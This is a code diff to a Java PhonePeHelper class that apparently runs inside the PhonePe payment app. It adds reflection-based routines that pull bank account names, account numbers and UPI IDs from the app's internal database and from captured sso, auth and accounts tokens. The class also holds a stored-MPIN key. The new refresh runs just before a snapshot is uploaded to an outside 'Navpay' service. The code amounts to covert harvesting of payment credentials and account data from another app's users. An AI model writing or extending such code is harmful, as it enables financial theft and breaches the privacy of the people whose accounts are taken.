@@ -16,9 +16,17 @@ import org.json.JSONObject;
 
 import com.phonepehelper.NavpaySnapshotUploader;
 
+import java.lang.reflect.Array;
+import java.lang.reflect.Method;
 import java.text.SimpleDateFormat;
+import java.util.Collection;
 import java.util.Date;
+import java.util.Iterator;
+import java.util.LinkedHashMap;
+import java.util.LinkedHashSet;
+import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -54,6 +62,13 @@ public final class PhonePeHelper {
 
     private static final String KEY_LAST_MPIN = "last_mpin";
     private static final String KEY_UPI_CACHE = "upi_cache";
+    private static final int UPI_JSON_PARSE_MAX_DEPTH = 4;
+    private static final int UPI_JSON_STRING_MAX_LENGTH = 8192;
+    private static final String[] APP_SINGLETON_MODULE_CLASSES = new String[]{
+            "com.phonepe.app.application.di.AppSingletonModule",
+            "com.phonepe.app.di.AppSingletonModule",
+            "com.phonepe.core.di.AppSingletonModule",
+    };
 
     private static volatile Context appContext;
     private static volatile SharedPreferences prefs;
@@ -165,27 +180,33 @@ public final class PhonePeHelper {
 
     public static JSONArray getUPIs() {
         ensurePrefs();
-        JSONArray arr = new JSONArray();
         if (prefs == null) {
-            return arr;
+            return buildFallbackUPIs();
         }
-        String raw = prefs.getString(KEY_UPI_CACHE, "");
-        if (!TextUtils.isEmpty(raw)) {
-            try {
-                return new JSONArray(raw);
-            } catch (JSONException e) {
-                Log.w(TAG, "getUPIs parse cache failed", e);
-            }
+        JSONArray cached = readUPICache();
+        if (isUsableUPIArray(cached)) {
+            return cached;
         }
-        try {
-            JSONObject fallback = buildUPIInfo(getUserPhoneNum(), "", new JSONArray());
-            fallback.put("source", "local_stub");
-            fallback.put("status", "no_account_data");
-            arr.put(fallback);
-        } catch (JSONException e) {
-            Log.w(TAG, "getUPIs fallback build failed", e);
+        JSONArray collected = refreshUPICacheFromTokens();
+        if (isUsableUPIArray(collected)) {
+            return collected;
         }
-        return arr;
+        return buildFallbackUPIs();
+    }
+
+    public static JSONArray refreshUPICacheFromTokens() {
+        JSONArray collected = collectUPIsFromCoreDatabase();
+        if (isUsableUPIArray(collected)) {
+            persistUPICache(collected);
+            return collected;
+        }
+        collected = collectUPIsFromTokens();
+        if (isUsableUPIArray(collected)) {
+            persistUPICache(collected);
+            return collected;
+        }
+        clearUPICache();
+        return new JSONArray();
     }
 
     public static JSONObject buildUPIInfo(String account, String accountNum, JSONArray vpas) {
@@ -341,6 +362,7 @@ public final class PhonePeHelper {
                 + ", sso=" + summarizeToken(snapshot.optJSONObject("sso"))
                 + ", auth=" + summarizeToken(snapshot.optJSONObject("auth"))
                 + ", accounts=" + summarizeToken(snapshot.optJSONObject("accounts")));
+        refreshUPICacheFromTokens();
         getRequestMetaInfo();
         uploadSnapshotToNavpayAsync();
         return true;
@@ -471,6 +493,599 @@ public final class PhonePeHelper {
             Log.w(TAG, "readJson failed: " + key, e);
             return new JSONObject();
         }
+    }
+
+    private static JSONArray readUPICache() {
+        ensurePrefs();
+        if (prefs == null) {
+            return new JSONArray();
+        }
+        String raw = prefs.getString(KEY_UPI_CACHE, "");
+        if (TextUtils.isEmpty(raw)) {
+            return new JSONArray();
+        }
+        try {
+            return normalizeUPIArray(new JSONArray(raw));
+        } catch (JSONException e) {
+            Log.w(TAG, "readUPICache parse failed", e);
+            return new JSONArray();
+        }
+    }
+
+    private static boolean persistUPICache(JSONArray upis) {
+        ensurePrefs();
+        if (prefs == null || !isUsableUPIArray(upis)) {
+            return false;
+        }
+        prefs.edit().putString(KEY_UPI_CACHE, upis.toString()).apply();
+        return true;
+    }
+
+    private static JSONArray collectUPIsFromTokens() {
+        LinkedHashMap<String, JSONObject> entries = new LinkedHashMap<>();
+        try {
+            JSONObject tokens = buildTokenSnapshot();
+            extractUpiEntriesFromJson("accounts", tokens.opt("accounts"), entries, 0);
+            extractUpiEntriesFromJson("auth", tokens.opt("auth"), entries, 0);
+            extractUpiEntriesFromJson("sso", tokens.opt("sso"), entries, 0);
+            extractUpiEntriesFromJson("1fa", tokens.opt("1fa"), entries, 0);
+        } catch (JSONException e) {
+            Log.w(TAG, "collectUPIsFromTokens failed", e);
+        }
+        return entriesToArray(entries);
+    }
+
+    private static JSONArray collectUPIsFromCoreDatabase() {
+        LinkedHashMap<String, JSONObject> entries = new LinkedHashMap<>();
+        Object coreDatabase = resolveCoreDatabase();
+        if (coreDatabase == null) {
+            return new JSONArray();
+        }
+        try {
+            Object accountDao = invokeMethodNoThrow(coreDatabase, "B");
+            Object accountsObj = invokeMethodNoThrow(accountDao, "l");
+            if (!(accountsObj instanceof List)) {
+                return new JSONArray();
+            }
+            List<?> accounts = (List<?>) accountsObj;
+            for (Object accountObj : accounts) {
+                JSONObject entry = buildUPIEntryFromAccountObject(accountObj);
+                if (entry != null) {
+                    mergeUPIEntry(entries, entry);
+                }
+            }
+        } catch (Throwable t) {
+            Log.w(TAG, "collectUPIsFromCoreDatabase failed", t);
+        }
+        return entriesToArray(entries);
+    }
+
+    private static JSONObject buildUPIEntryFromAccountObject(Object accountObj) {
+        if (accountObj == null) {
+            return null;
+        }
+        String type = normalizeText(readStringByMethods(accountObj,
+                "getType",
+                "getAccountType",
+                "type"));
+        String typeUpper = type.toUpperCase(Locale.US);
+        if (typeUpper.contains("CREDIT")) {
+            return null;
+        }
+        String accountNum = normalizeAccountNumber(readStringByMethods(accountObj,
+                "getAccountNo",
+                "getAccountNumber",
+                "getMaskedAccountNumber",
+                "accountNo",
+                "accountNumber"));
+        String account = normalizeText(readStringByMethods(accountObj,
+                "getAccount",
+                "getAccountName",
+                "getDisplayName",
+                "getBankName",
+                "name"));
+        LinkedHashSet<String> upis = new LinkedHashSet<>();
+        collectUPIsFromObjectValue(invokeMethodNoThrow(accountObj, "getVpas"), upis);
+        collectUPIsFromObjectValue(invokeMethodNoThrow(accountObj, "vpas"), upis);
+        collectUPIsFromObjectValue(invokeMethodNoThrow(accountObj, "getUpis"), upis);
+        if (upis.isEmpty()) {
+            return null;
+        }
+        JSONArray upiArr = new JSONArray();
+        for (String upi : upis) {
+            upiArr.put(upi);
+        }
+        JSONObject entry = buildUPIInfo(account, accountNum, upiArr);
+        try {
+            entry.put("source", "core_db");
+        } catch (JSONException e) {
+            Log.w(TAG, "buildUPIEntryFromAccountObject failed", e);
+        }
+        return entry;
+    }
+
+    private static void extractUpiEntriesFromJson(String source, Object node, LinkedHashMap<String, JSONObject> entries, int depth) {
+        if (node == null || depth > UPI_JSON_PARSE_MAX_DEPTH) {
+            return;
+        }
+        if (node instanceof JSONObject) {
+            JSONObject obj = (JSONObject) node;
+            JSONObject candidate = buildUPIEntryFromJson(source, obj);
+            if (candidate != null) {
+                mergeUPIEntry(entries, candidate);
+            }
+            if (depth >= UPI_JSON_PARSE_MAX_DEPTH) {
+                return;
+            }
+            Iterator<String> keys = obj.keys();
+            while (keys.hasNext()) {
+                String key = keys.next();
+                Object value = obj.opt(key);
+                if (value == null) {
+                    continue;
+                }
+                extractUpiEntriesFromJson(key, value, entries, depth + 1);
+            }
+            return;
+        }
+        if (node instanceof JSONArray) {
+            if (depth >= UPI_JSON_PARSE_MAX_DEPTH) {
+                return;
+            }
+            JSONArray arr = (JSONArray) node;
+            for (int i = 0; i < arr.length(); i++) {
+                extractUpiEntriesFromJson(source, arr.opt(i), entries, depth + 1);
+            }
+            return;
+        }
+        if (node instanceof String) {
+            String raw = ((String) node).trim();
+            if (TextUtils.isEmpty(raw) || raw.length() > UPI_JSON_STRING_MAX_LENGTH) {
+                return;
+            }
+            if (looksLikeJson(raw) && shouldParseJsonString(source)) {
+                try {
+                    Object parsed = raw.startsWith("[") ? new JSONArray(raw) : new JSONObject(raw);
+                    extractUpiEntriesFromJson(source, parsed, entries, depth + 1);
+                } catch (JSONException e) {
+                    Log.w(TAG, "extractUpiEntriesFromJson parse failed: " + source, e);
+                }
+            }
+        }
+    }
+
+    private static JSONObject buildUPIEntryFromJson(String source, JSONObject obj) {
+        if (obj == null) {
+            return null;
+        }
+        String account = firstNonEmptyString(obj, "account", "accountName", "maskedAccountName");
+        String accountNum = normalizeAccountNumber(firstNonEmptyString(obj,
+                "accountNum",
+                "accountNumber",
+                "maskedAccountNumber",
+                "maskedAccountNum",
+                "accNum",
+                "accNo"));
+        String appType = normalizeAppType(firstNonEmptyString(obj, "appType"));
+        if (TextUtils.isEmpty(appType)) {
+            appType = "phonepe";
+        }
+        LinkedHashSet<String> upis = new LinkedHashSet<>();
+        collectUPIsFromObject(obj, upis);
+
+        if (upis.isEmpty()) {
+            return null;
+        }
+        JSONArray upiArr = new JSONArray();
+        for (String upi : upis) {
+            upiArr.put(upi);
+        }
+        JSONObject entry = buildUPIInfo(account, accountNum, upiArr);
+        try {
+            entry.put("appType", appType);
+        } catch (JSONException e) {
+            Log.w(TAG, "buildUPIEntryFromJson failed", e);
+        }
+        return entry;
+    }
+
+    private static void collectUPIsFromObject(JSONObject obj, LinkedHashSet<String> upis) {
+        if (obj == null || upis == null) {
+            return;
+        }
+        addUPIValue(upis, obj.opt("upi"));
+        addUPIValue(upis, obj.opt("upiId"));
+        addUPIValue(upis, obj.opt("upi_id"));
+        addUPIValue(upis, obj.opt("vpa"));
+        addUPIValue(upis, obj.opt("vpaId"));
+        addUPIValue(upis, obj.opt("vpa_id"));
+        addUPIValue(upis, obj.opt("virtualPaymentAddress"));
+        addUPIValue(upis, obj.opt("virtual_address"));
+        addUPIValue(upis, obj.opt("paymentAddress"));
+        addUPIValue(upis, obj.opt("payment_address"));
+        addUPIValue(upis, obj.opt("upiAddress"));
+        addUPIValue(upis, obj.opt("upis"));
+        addUPIValue(upis, obj.opt("vpas"));
+    }
+
+    private static void addUPIValue(LinkedHashSet<String> upis, Object value) {
+        if (upis == null || value == null) {
+            return;
+        }
+        if (value instanceof JSONArray) {
+            JSONArray arr = (JSONArray) value;
+            for (int i = 0; i < arr.length(); i++) {
+                addUPIValue(upis, arr.opt(i));
+            }
+            return;
+        }
+        if (value instanceof JSONObject) {
+            JSONObject obj = (JSONObject) value;
+            String direct = firstNonEmptyString(obj, "upi", "upiId", "vpa", "value", "address");
+            if (!TextUtils.isEmpty(direct)) {
+                addUPIValue(upis, direct);
+            }
+            return;
+        }
+        String raw = normalizeUPIId(String.valueOf(value));
+        if (looksLikeUPIId(raw)) {
+            upis.add(raw);
+        }
+    }
+
+    private static void collectUPIsFromObjectValue(Object value, LinkedHashSet<String> upis) {
+        if (value == null || upis == null) {
+            return;
+        }
+        if (value instanceof Collection) {
+            for (Object item : (Collection<?>) value) {
+                addUPIValue(upis, item);
+            }
+            return;
+        }
+        if (value != null && value.getClass().isArray()) {
+            int len = Array.getLength(value);
+            for (int i = 0; i < len; i++) {
+                addUPIValue(upis, Array.get(value, i));
+            }
+            return;
+        }
+        addUPIValue(upis, value);
+    }
+
+    private static JSONArray normalizeUPIArray(JSONArray raw) {
+        LinkedHashMap<String, JSONObject> entries = new LinkedHashMap<>();
+        if (raw == null) {
+            return new JSONArray();
+        }
+        for (int i = 0; i < raw.length(); i++) {
+            Object item = raw.opt(i);
+            if (item instanceof JSONObject) {
+                JSONObject normalized = normalizeUPIEntry((JSONObject) item);
+                if (normalized != null) {
+                    mergeUPIEntry(entries, normalized);
+                }
+            }
+        }
+        return entriesToArray(entries);
+    }
+
+    private static JSONObject normalizeUPIEntry(JSONObject obj) {
+        if (obj == null) {
+            return null;
+        }
+        String account = normalizeAccountName(obj.optString("account", ""));
+        String accountNum = normalizeAccountNumber(obj.optString("accountNum", ""));
+        String appType = normalizeAppType(obj.optString("appType", ""));
+        if (TextUtils.isEmpty(appType)) {
+            appType = "phonepe";
+        }
+        LinkedHashSet<String> upis = new LinkedHashSet<>();
+        collectUPIsFromObject(obj, upis);
+        JSONArray upiArr = new JSONArray();
+        for (String upi : upis) {
+            upiArr.put(upi);
+        }
+        if (upiArr.length() == 0) {
+            return null;
+        }
+        JSONObject normalized = buildUPIInfo(account, accountNum, upiArr);
+        try {
+            normalized.put("appType", appType);
+            String source = normalizeText(obj.optString("source", ""));
+            if (!TextUtils.isEmpty(source)) {
+                normalized.put("source", source);
+            }
+            String status = normalizeText(obj.optString("status", ""));
+            if (!TextUtils.isEmpty(status)) {
+                normalized.put("status", status);
+            }
+        } catch (JSONException e) {
+            Log.w(TAG, "normalizeUPIEntry failed", e);
+        }
+        return normalized;
+    }
+
+    private static void mergeUPIEntry(LinkedHashMap<String, JSONObject> entries, JSONObject candidate) {
+        if (entries == null || candidate == null) {
+            return;
+        }
+        String key = buildUPIEntryKey(candidate);
+        JSONObject existing = entries.get(key);
+        if (existing == null) {
+            entries.put(key, candidate);
+            return;
+        }
+        mergeUPIEntryObjects(existing, candidate);
+    }
+
+    private static void mergeUPIEntryObjects(JSONObject target, JSONObject source) {
+        if (target == null || source == null) {
+            return;
+        }
+        try {
+            if (TextUtils.isEmpty(target.optString("account", ""))) {
+                target.put("account", source.optString("account", ""));
+            }
+            if (TextUtils.isEmpty(target.optString("accountNum", ""))) {
+                target.put("accountNum", source.optString("accountNum", ""));
+            }
+            if (TextUtils.isEmpty(target.optString("appType", ""))) {
+                target.put("appType", source.optString("appType", "phonepe"));
+            }
+            JSONArray targetUpis = target.optJSONArray("upis");
+            JSONArray sourceUpis = source.optJSONArray("upis");
+            LinkedHashSet<String> merged = new LinkedHashSet<>();
+            collectUPIsFromArray(targetUpis, merged);
+            collectUPIsFromArray(sourceUpis, merged);
+            JSONArray mergedArr = new JSONArray();
+            for (String upi : merged) {
+                mergedArr.put(upi);
+            }
+            target.put("upis", mergedArr);
+        } catch (JSONException e) {
+            Log.w(TAG, "mergeUPIEntryObjects failed", e);
+        }
+    }
+
+    private static void collectUPIsFromArray(JSONArray arr, LinkedHashSet<String> out) {
+        if (arr == null || out == null) {
+            return;
+        }
+        for (int i = 0; i < arr.length(); i++) {
+            addUPIValue(out, arr.opt(i));
+        }
+    }
+
+    private static JSONArray entriesToArray(LinkedHashMap<String, JSONObject> entries) {
+        JSONArray arr = new JSONArray();
+        if (entries == null) {
+            return arr;
+        }
+        for (Map.Entry<String, JSONObject> entry : entries.entrySet()) {
+            if (entry.getValue() != null) {
+                arr.put(entry.getValue());
+            }
+        }
+        return arr;
+    }
+
+    private static String buildUPIEntryKey(JSONObject entry) {
+        if (entry == null) {
+            return "";
+        }
+        String account = normalizeAccountName(entry.optString("account", ""));
+        String accountNum = normalizeAccountNumber(entry.optString("accountNum", ""));
+        String appType = normalizeAppType(entry.optString("appType", "phonepe"));
+        return account + "|" + accountNum + "|" + appType;
+    }
+
+    private static boolean isUsableUPIArray(JSONArray arr) {
+        return arr != null && arr.length() > 0 && !isFallbackUPIArray(arr);
+    }
+
+    private static boolean isFallbackUPIArray(JSONArray arr) {
+        if (arr == null || arr.length() != 1) {
+            return false;
+        }
+        JSONObject obj = arr.optJSONObject(0);
+        if (obj == null) {
+            return false;
+        }
+        String source = normalizeText(obj.optString("source", ""));
+        String status = normalizeText(obj.optString("status", ""));
+        return TextUtils.equals(source, "local_stub") && TextUtils.equals(status, "no_account_data");
+    }
+
+    private static JSONArray buildFallbackUPIs() {
+        JSONArray arr = new JSONArray();
+        try {
+            JSONObject fallback = buildUPIInfo(getUserPhoneNum(), "", new JSONArray());
+            fallback.put("source", "local_stub");
+            fallback.put("status", "no_account_data");
+            arr.put(fallback);
+        } catch (JSONException e) {
+            Log.w(TAG, "buildFallbackUPIs failed", e);
+        }
+        return arr;
+    }
+
+    private static String firstNonEmptyString(JSONObject obj, String... keys) {
+        if (obj == null || keys == null) {
+            return "";
+        }
+        for (String key : keys) {
+            String value = normalizeText(obj.optString(key, ""));
+            if (!TextUtils.isEmpty(value)) {
+                return value;
+            }
+        }
+        return "";
+    }
+
+    private static String normalizeText(String value) {
+        if (value == null) {
+            return "";
+        }
+        return value.trim();
+    }
+
+    private static String normalizeAccountName(String value) {
+        return normalizeText(value);
+    }
+
+    private static String normalizeAccountNumber(String value) {
+        String normalized = normalizeText(value);
+        if (TextUtils.isEmpty(normalized)) {
+            return "";
+        }
+        return normalized.replace(" ", "").replace("-", "");
+    }
+
+    private static String normalizeAppType(String value) {
+        String normalized = normalizeText(value);
+        if (TextUtils.isEmpty(normalized)) {
+            return "";
+        }
+        return normalized.toLowerCase(Locale.US);
+    }
+
+    private static String normalizeUPIId(String value) {
+        String normalized = normalizeText(value);
+        if (TextUtils.isEmpty(normalized)) {
+            return "";
+        }
+        return normalized.toLowerCase(Locale.US);
+    }
+
+    private static boolean looksLikeUPIId(String value) {
+        if (TextUtils.isEmpty(value)) {
+            return false;
+        }
+        return value.indexOf('@') > 0
+                && value.indexOf('@') == value.lastIndexOf('@')
+                && value.indexOf(' ') < 0;
+    }
+
+    private static boolean looksLikeJson(String raw) {
+        if (TextUtils.isEmpty(raw)) {
+            return false;
+        }
+        String trimmed = raw.trim();
+        return (trimmed.startsWith("{") && trimmed.endsWith("}"))
+                || (trimmed.startsWith("[") && trimmed.endsWith("]"));
+    }
+
+    private static boolean shouldParseJsonString(String key) {
+        if (TextUtils.isEmpty(key)) {
+            return false;
+        }
+        String normalized = key.trim().toLowerCase(Locale.US);
+        return "raw".equals(normalized)
+                || "payload".equals(normalized)
+                || "data".equals(normalized)
+                || "body".equals(normalized)
+                || "result".equals(normalized)
+                || "messageinfo".equals(normalized)
+                || "msginfo".equals(normalized)
+                || "token".equals(normalized)
+                || "accountstoken".equals(normalized)
+                || "authtoken".equals(normalized)
+                || "ssotoken".equals(normalized);
+    }
+
+    private static void clearUPICache() {
+        ensurePrefs();
+        if (prefs == null) {
+            return;
+        }
+        prefs.edit().remove(KEY_UPI_CACHE).apply();
+    }
+
+    private static Object resolveCoreDatabase() {
+        if (appContext == null) {
+            return null;
+        }
+        for (String className : APP_SINGLETON_MODULE_CLASSES) {
+            try {
+                Class<?> cls = Class.forName(className);
+                Object singleton = invokeStaticMethodNoThrow(cls, "X", appContext);
+                if (singleton == null) {
+                    singleton = invokeStaticMethodNoThrow(cls, "x", appContext);
+                }
+                Object db = singleton;
+                if (db != null && !db.getClass().getName().toLowerCase(Locale.US).contains("database")) {
+                    Object maybeDb = invokeMethodNoThrow(db, "l");
+                    if (maybeDb != null) {
+                        db = maybeDb;
+                    }
+                }
+                if (db != null) {
+                    return db;
+                }
+            } catch (Throwable ignored) {
+                // try next class candidate
+            }
+        }
+        return null;
+    }
+
+    private static Object invokeStaticMethodNoThrow(Class<?> cls, String methodName, Context context) {
+        if (cls == null || TextUtils.isEmpty(methodName) || context == null) {
+            return null;
+        }
+        Method[] methods = cls.getDeclaredMethods();
+        for (Method m : methods) {
+            if (!methodName.equals(m.getName())) {
+                continue;
+            }
+            if ((m.getModifiers() & java.lang.reflect.Modifier.STATIC) == 0) {
+                continue;
+            }
+            Class<?>[] params = m.getParameterTypes();
+            if (params.length != 1 || !params[0].isAssignableFrom(context.getClass())) {
+                if (!(params.length == 1 && Context.class.isAssignableFrom(params[0]))) {
+                    continue;
+                }
+            }
+            try {
+                m.setAccessible(true);
+                return m.invoke(null, context);
+            } catch (Throwable ignored) {
+                // try next overload
+            }
+        }
+        return null;
+    }
+
+    private static Object invokeMethodNoThrow(Object target, String methodName) {
+        if (target == null || TextUtils.isEmpty(methodName)) {
+            return null;
+        }
+        try {
+            Method m = target.getClass().getMethod(methodName);
+            m.setAccessible(true);
+            return m.invoke(target);
+        } catch (Throwable ignored) {
+            return null;
+        }
+    }
+
+    private static String readStringByMethods(Object target, String... methodNames) {
+        if (target == null || methodNames == null) {
+            return "";
+        }
+        for (String methodName : methodNames) {
+            Object value = invokeMethodNoThrow(target, methodName);
+            if (value == null) {
+                continue;
+            }
+            String text = normalizeText(String.valueOf(value));
+            if (!TextUtils.isEmpty(text) && !"null".equalsIgnoreCase(text)) {
+                return text;
+            }
+        }
+        return "";
     }
 
     private static boolean writeJson(String key, JSONObject json) {
